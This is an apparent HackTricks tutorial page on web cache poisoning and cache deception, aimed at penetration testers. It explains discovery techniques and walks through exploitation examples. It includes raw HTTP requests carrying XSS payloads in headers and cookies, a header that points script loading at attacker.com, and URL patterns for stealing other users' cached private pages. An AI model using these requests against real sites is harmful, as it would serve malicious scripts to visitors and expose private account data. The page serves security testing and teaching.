# Cache Poisoning and Cache Deception

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=cache-deception) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

## The difference

> **What is the difference between web cache poisoning and web cache deception?**
>
> * In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
> * In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

## Cache Poisoning

Cache poisoning is aimed at manipulating the client-side cache to force clients to load resources that are unexpected, partial, or under the control of an attacker. The extent of the impact is contingent on the popularity of the affected page, as the tainted response is served exclusively to users visiting the page during the period of cache contamination.

The execution of a cache poisoning assault involves several steps:

1. **Identification of Unkeyed Inputs**: These are parameters that, although not required for a request to be cached, can alter the response returned by the server. Identifying these inputs is crucial as they can be exploited to manipulate the cache.
2. **Exploitation of the Unkeyed Inputs**: After identifying the unkeyed inputs, the next step involves figuring out how to misuse these parameters to modify the server's response in a way that benefits the attacker.
3. **Ensuring the Poisoned Response is Cached**: The final step is to ensure that the manipulated response is stored in the cache. This way, any user accessing the affected page while the cache is poisoned will receive the tainted response.

### Discovery: Check HTTP headers

Usually, when a response was **stored in the cache** there will be a **header indicating so**, you can check which headers you should pay attention to in this post: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Discovery: Caching error codes

If you are thinking that the response is being stored in a cache, you could try to **send requests with a bad header**, which should be responded to with a **status code 400**. Then try to access the request normally and if the **response is a 400 status code**, you know it's vulnerable (and you could even perform a DoS).

You can find more options in:

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

However, note that **sometimes these kinds of status codes aren't cached** so this test could not be reliable.

### Discovery: Identify and evaluate unkeyed inputs

You could use [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) to **brute-force parameters and headers** that may be **changing the response of the page**. For example, a page may be using the header `X-Forwarded-For` to indicate the client to load the script from there:

```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```

### Elicit a harmful response from the back-end server

With the parameter/header identified check how it is being **sanitised** and **where** is it **getting reflected** or affecting the response from the header. Can you abuse it anyway (perform an XSS or load a JS code controlled by you? perform a DoS?...)

### Get the response cached

Once you have **identified** the **page** that can be abused, which **parameter**/**header** to use and **how** to **abuse** it, you need to get the page cached. Depending on the resource you are trying to get in the cache this could take some time, you might need to be trying for several seconds.

The header **`X-Cache`** in the response could be very useful as it may have the value **`miss`** when the request wasn't cached and the value **`hit`** when it is cached.\
The header **`Cache-Control`** is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`

Another interesting header is **`Vary`**. This header is often used to **indicate additional headers** that are treated as **part of the cache key** even if they are normally unkeyed. Therefore, if the user knows the `User-Agent` of the victim he is targeting, he can poison the cache for the users using that specific `User-Agent`.

One more header related to the cache is **`Age`**. It defines the times in seconds the object has been in the proxy cache.

When caching a request, be **careful with the headers you use** because some of them could be **used unexpectedly** as **keyed** and the **victim will need to use that same header**. Always **test** a Cache Poisoning with **different browsers** to check if it's working.

## Exploiting Examples

### Easiest example

A header like `X-Forwarded-For` is being reflected in the response unsanitized.\
You can send a basic XSS payload and poison the cache so everybody that accesses the page will be XSSed:

```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```

_Note that this will poison a request to `/en?region=uk` not to `/en`_

### Cache poisoning to DoS

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies could also be reflected on the response of a page. If you can abuse it to cause a XSS for example, you could be able to exploit XSS in several clients that load the malicious cache response.

```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```

Note that if the vulnerable cookie is very used by the users, regular requests will be cleaning the cache.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Check:

{% content-ref url="cache-poisoning-via-url-discrepancies.md" %}
[cache-poisoning-via-url-discrepancies.md](cache-poisoning-via-url-discrepancies.md)
{% endcontent-ref %}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) how it was possible to steal an OpenAI API key with an URL like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` because anything matching `/share/*` will be cached without Cloudflare normalising the URL, which was done when the request reached the web server.

This is also explained better in:

{% content-ref url="cache-poisoning-via-url-discrepancies.md" %}
[cache-poisoning-via-url-discrepancies.md](cache-poisoning-via-url-discrepancies.md)
{% endcontent-ref %}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Sometimes you will need to **exploit several unkeyed inputs** to be able to abuse a cache. For example, you may find an **Open redirect** if you set `X-Forwarded-Host` to a domain controlled by you and `X-Forwarded-Scheme` to `http`.**If** the **server** is **forwarding** all the **HTTP** requests **to HTTPS** and using the header `X-Forwarded-Scheme` as the domain name for the redirect. You can control where the page is pointed by the redirect.

```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```

### Exploiting with limited `Vary`header

If you found that the **`X-Host`** header is being used as **domain name to load a JS resource** but the **`Vary`** header in the response is indicating **`User-Agent`**. Then, you need to find a way to exfiltrate the User-Agent of the victim and poison the cache using that user agent:

```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```

### Fat Get

Send a GET request with the request in the URL and in the body. If the web server uses the one from the body but the cache server caches the one from the URL, anyone accessing that URL will actually use the parameter from the body. Like the vuln James Kettle found at the Github website:

```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

For example it's possible to separate **parameters** in ruby servers using the char **`;`** instead of **`&`**. This could be used to put unkeyed parameters values inside keyed ones and abuse them.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Learn here about how to perform [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

The [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) can be used to automatically test for web cache poisoning. It supports many different techniques and is highly customizable.

Example usage: `wcvs -u example.com`

## Vulnerable Examples

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS forwarded the fragment inside the URL without stripping it and generated the cache key only using the host, path and query (ignoring the fragment). So the request `/#/../?r=javascript:alert(1)` was sent to the backend as `/#/../?r=javascript:alert(1)` and the cache key didn't have the payload inside of it, only host, path and query.

### GitHub CP-DoS

Sending a bad value in the content-type header triggered a 405 cached response. The cache key contained the cookie so it was possible only to attack unauth users.

### GitLab + GCP CP-DoS

GitLab uses GCP buckets to store static content. **GCP Buckets** support the **header `x-http-method-override`**. So it was possible to send the header `x-http-method-override: HEAD` and poison the cache into returning an empty response body. It could also support the method `PURGE`.

### Rack Middleware (Ruby on Rails)

In Ruby on Rails applications, Rack middleware is often utilized. The purpose of the Rack code is to take the value of the **`x-forwarded-scheme`** header and set it as the request's scheme. When the header `x-forwarded-scheme: http` is sent, a 301 redirect to the same location occurs, potentially causing a Denial of Service (DoS) to that resource. Additionally, the application might acknowledge the `X-forwarded-host` header and redirect users to the specified host. This behavior can lead to the loading of JavaScript files from an attacker's server, posing a security risk.

### 403 and Storage Buckets

Cloudflare previously cached 403 responses. Attempting to access S3 or Azure Storage Blobs with incorrect Authorization headers would result in a 403 response that got cached. Although Cloudflare has stopped caching 403 responses, this behavior might still be present in other proxy services.

### Injecting Keyed Parameters

Caches often include specific GET parameters in the cache key. For instance, Fastly's Varnish cached the `size` parameter in requests. However, if a URL-encoded version of the parameter (e.g., `siz%65`) was also sent with an erroneous value, the cache key would be constructed using the correct `size` parameter. Yet, the backend would process the value in the URL-encoded parameter. URL-encoding the second `size` parameter led to its omission by the cache but its utilization by the backend. Assigning a value of 0 to this parameter resulted in a cacheable 400 Bad Request error.

### User Agent Rules

Some developers block requests with user-agents matching those of high-traffic tools like FFUF or Nuclei to manage server load. Ironically, this approach can introduce vulnerabilities such as cache poisoning and DoS.

### Illegal Header Fields

The [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) specifies the acceptable characters in header names. Headers containing characters outside of the specified **tchar** range should ideally trigger a 400 Bad Request response. In practice, servers don't always adhere to this standard. A notable example is Akamai, which forwards headers with invalid characters and caches any 400 error, as long as the `cache-control` header is not present. An exploitable pattern was identified where sending a header with an illegal character, such as `\`, would result in a cacheable 400 Bad Request error.

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

First of all note that **extensions** such as `.css`, `.js`, `.png` etc are usually **configured** to be **saved** in the **cache.** Therefore, if you access `www.example.com/profile.php/nonexistent.js` the cache will probably store the response because it sees the `.js` **extension**. But, if the **application** is **replaying** with the **sensitive** user contents stored in _www.example.com/profile.php_, you can **steal** those contents from other users.

Other things to test:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
In the example, it is explained that if you load a non-existent page like _http://www.example.com/home.php/non-existent.css_ the content of _http://www.example.com/home.php_ (**with the user's sensitive information**) is going to be returned and the cache server is going to save the result.\
Then, the **attacker** can access _http://www.example.com/home.php/non-existent.css_ in their own browser and observe the **confidential information** of the users that accessed before.

Note that the **cache proxy** should be **configured** to **cache** files **based** on the **extension** of the file (_.css_) and not base on the content-type. In the example _http://www.example.com/home.php/non-existent.css_ will have a `text/html` content-type instead of a `text/css` mime type (which is the expected for a _.css_ file).

Learn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception).

## Automatic Tools

* [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner to find web cache poisoning vulnerabilities in a list of URLs and test multiple injection techniques.

## References

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=cache-deception) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

